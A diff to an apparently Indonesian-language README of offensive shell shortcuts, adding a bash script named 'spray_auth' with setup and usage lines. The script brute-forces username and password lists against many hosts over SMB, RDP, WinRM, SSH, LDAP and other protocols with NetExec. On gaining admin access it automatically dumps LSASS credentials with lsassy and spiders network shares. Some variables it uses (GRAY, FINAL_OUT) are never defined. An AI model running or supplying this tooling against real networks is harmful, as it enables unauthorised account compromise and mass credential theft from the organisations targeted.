@@ -621,5 +621,175 @@ spray_noauth (default baca file "target" yang berisi list IP)
 spray_noauth target1
 ```
 
-### Info
-- Default if running without parameter spray = spray target user pass
+
+## 8. spray_auth
+
+**Deskripsi:** Shortcut cepat untuk spray bruteforce user dan password (coba semua protokol nxc: smb, ssh, ldap, ftp, wmi, winrm, rdp, vnc, mssql, nfs)
+
+### Setup
+```bash
+sudo nano /usr/local/bin/spray_auth
+sudo chmod +x /usr/local/bin/spray_auth
+```
+
+### Script
+```bash
+#!/bin/bash
+
+# --- COLORS ---
+BLUE='\033[0;34m'
+CYAN='\033[0;36m'
+GREEN='\033[0;32m'
+PURPLE='\033[0;35m'
+YELLOW='\033[1;33m'
+RED='\033[0;31m'
+NC='\033[0m'
+
+TARGET_FILE=${1:-target}
+USER_FILE=${2:-user}
+PASS_FILE=${3:-pass}
+
+OUTDIR="spray_netexec"
+RAW_OUT="$OUTDIR/raw_auth_spray.txt"
+CLEAN_OUT="$OUTDIR/final_auth_success.txt"
+SPIDER_DIR="$OUTDIR/spider_plus"
+
+echo -e "${PURPLE}====================================================${NC}"
+echo -e "${GREEN}[+] SPRAY ENGINE v59 | DEBUG & EXPLICIT MODE${NC}"
+echo -e "${PURPLE}====================================================${NC}"
+
+# Validasi File
+for f in "$TARGET_FILE" "$USER_FILE" "$PASS_FILE"; do
+    [[ ! -f "$f" ]] && echo -e "${RED}[!] Error: File '$f' tidak ada!${NC}" && exit 1
+done
+
+mapfile -t MAPFILE_U < "$USER_FILE"
+mapfile -t MAPFILE_P < "$PASS_FILE"
+
+PROTOCOLS=("smb" "rdp" "wmi" "winrm" "mssql" "ssh" "ftp" "vnc" "ldap")
+
+for proto in "${PROTOCOLS[@]}"; do
+    FILE_PROTO="$OUTDIR/active_$proto.txt"
+    [[ ! -s "$FILE_PROTO" ]] && continue
+
+    echo -e "\n${BLUE}====================================================${NC}"
+    echo -e "${BLUE}[+] PROTOCOL: ${proto^^}${NC}"
+    echo -e "${BLUE}====================================================${NC}"
+    
+    for ip in $(cat "$FILE_PROTO"); do
+        echo -e "\n${CYAN}>>> Target Host: $ip${NC}"
+        
+        # Discovery Domain (Debugging)
+        echo -e "${GRAY}[DEBUG] Discovering domain for $ip...${NC}"
+        DOMAIN=$(nxc smb "$ip" --no-progress 2>/dev/null | grep -oP '(?<=domain:)[^ )]+' | head -n 1)
+        [[ -z "$DOMAIN" ]] && DOMAIN="."
+        echo -e "${GRAY}[DEBUG] Domain detected: $DOMAIN${NC}"
+
+        for user in "${MAPFILE_U[@]}"; do
+            USER_COMPLETED=false
+
+            for pass in "${MAPFILE_P[@]}"; do
+                
+                # --- 1. STRATEGY: LOCAL AUTH ---
+                EXTRA=""
+                [[ "$proto" =~ ^(smb|rdp|wmi|winrm|mssql)$ ]] && EXTRA="--local-auth"
+                
+                # DEBUG COMMAND ECHO
+                echo -e "\n${PURPLE}[EXEC] nxc $proto $ip -u '$user' -p '$pass' $EXTRA${NC}"
+                
+                # RUN & SHOW OUTPUT
+                # Kita tidak pakai -ne \r lagi supaya output asli NXC tidak tertimpa
+                timeout 25s nxc "$proto" "$ip" -u "$user" -p "$pass" $EXTRA --no-progress > .tmp_res 2>&1
+                cat .tmp_res # Mencetak output asli NXC ke layar
+                cat .tmp_res >> "$RAW_OUT"
+                
+                if grep -qE "\[\+\]|Pwn3d\!" .tmp_res; then
+                    echo -e "${GREEN}[!] Success found! Logging to $CLEAN_OUT${NC}"
+                    grep -E "\[\+\]|Pwn3d\!" .tmp_res | head -n 1 >> "$CLEAN_OUT"
+                    USER_COMPLETED=true
+                    
+                    if [[ "$proto" == "smb" && $(grep "Pwn3d!" .tmp_res) ]]; then
+                        echo -e "${RED}[DEBUG] Pwn3d status confirmed. Triggering Post-Exploitation...${NC}"
+                        echo -e "${PURPLE}[EXEC] nxc smb $ip -u '$user' -p '$pass' $EXTRA -M lsassy${NC}"
+                        nxc smb "$ip" -u "$user" -p "$pass" $EXTRA -M lsassy | tee -a "$RAW_OUT"
+                        
+                        echo -e "${PURPLE}[EXEC] nxc smb $ip -u '$user' -p '$pass' $EXTRA -M spider_plus${NC}"
+                        nxc smb "$ip" -u "$user" -p "$pass" $EXTRA -M spider_plus -o DOWNLOAD_FLAG=FALSE EXCLUDE_FILTER="c\$,ipc\$,admin\$,netlogon,sysvol" OUTPUT_FOLDER="$(readlink -f $SPIDER_DIR)" > /dev/null 2>&1
+                    fi
+                fi
+
+                # --- 2. STRATEGY: DOMAIN AUTH ---
+                if [[ "$USER_COMPLETED" == "false" && "$proto" =~ ^(smb|rdp|wmi|winrm|mssql|ldap)$ ]]; then
+                    echo -e "${PURPLE}[EXEC] nxc $proto $ip -u '$user' -p '$pass' -d '$DOMAIN'${NC}"
+                    
+                    timeout 25s nxc "$proto" "$ip" -u "$user" -p "$pass" -d "$DOMAIN" --no-progress > .tmp_res 2>&1
+                    cat .tmp_res
+                    cat .tmp_res >> "$RAW_OUT"
+                    
+                    if grep -qE "\[\+\]|Pwn3d\!" .tmp_res; then
+                        echo -e "${GREEN}[!] Success found! Logging to $CLEAN_OUT${NC}"
+                        grep -E "\[\+\]|Pwn3d\!" .tmp_res | head -n 1 >> "$CLEAN_OUT"
+                        USER_COMPLETED=true
+                        
+                        if [[ "$proto" == "smb" && $(grep "Pwn3d!" .tmp_res) ]]; then
+                            echo -e "${RED}[DEBUG] Pwn3d status (Domain) confirmed. Triggering Post-Exploitation...${NC}"
+                            nxc smb "$ip" -u "$user" -p "$pass" -d "$DOMAIN" -M lsassy | tee -a "$RAW_OUT"
+                            nxc smb "$ip" -u "$user" -p "$pass" -d "$DOMAIN" -M spider_plus -o DOWNLOAD_FLAG=FALSE EXCLUDE_FILTER="c\$,ipc\$,admin\$,netlogon,sysvol" OUTPUT_FOLDER="$(readlink -f $SPIDER_DIR)" > /dev/null 2>&1
+                        fi
+                    fi
+                fi
+
+                if [[ "$USER_COMPLETED" == "true" ]]; then
+                    echo -e "${CYAN}[i] Skipping other passwords for user: $user${NC}"
+                    break 
+                fi
+                
+                rm -f .tmp_res
+            done
+        done
+    done
+done
+
+# --- MULAI PROSES PEMBERSIHAN (DI LUAR LOOP) ---
+
+# Bersihkan file output standar
+sed -i 's/\x1B\[[0-9;]*[mK]//g' "$CLEAN_OUT" 2>/dev/null
+sort -u "$CLEAN_OUT" -o "$CLEAN_OUT" 2>/dev/null
+
+echo -e "\n${PURPLE}====================================================${NC}"
+echo -e "${GREEN}[+] PHASE 4: FINAL CLEAN SUMMARY${NC}"
+echo -e "${PURPLE}====================================================${NC}"
+
+# 1. Bersihkan kode warna ANSI dari log mentah (RAW_OUT)
+sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" "$RAW_OUT" > "$OUTDIR/temp_clean.log"
+
+# 2. Ambil baris penting & Hapus Duplikat
+grep -E "\[\*\]|\[\+\]|LSASSY" "$OUTDIR/temp_clean.log" | sort -u > "$FINAL_OUT"
+
+# 3. Cetak ke layar dengan Highlighting agar enak dibaca
+if [[ -s "$FINAL_OUT" ]]; then
+    while IFS= read -r line; do
+        if [[ "$line" == *"LSASSY"* ]]; then
+            echo -e "${PURPLE}${line}${NC}"
+        elif [[ "$line" == *"[+]"* ]]; then
+            echo -e "${GREEN}${line}${NC}"
+        else
+            echo -e "${BLUE}${line}${NC}"
+        fi
+    done < "$FINAL_OUT"
+else
+    echo -e "${YELLOW}[!] Tidak ada temuan valid untuk diringkas.${NC}"
+fi
+
+# 4. Cleanup & End
+rm "$OUTDIR/temp_clean.log" 2>/dev/null
+
+echo -e "\n${GREEN}[!] Ringkasan bersih disimpan di: $FINAL_OUT${NC}"
+echo -e "\n${GREEN}[+] ALL PROCESSES FINISHED.${NC}"
+```
+
+### Usage
+```bash
+spray_auth (default baca file "target" yang berisi list IP)
+spray_auth target user pass
+```
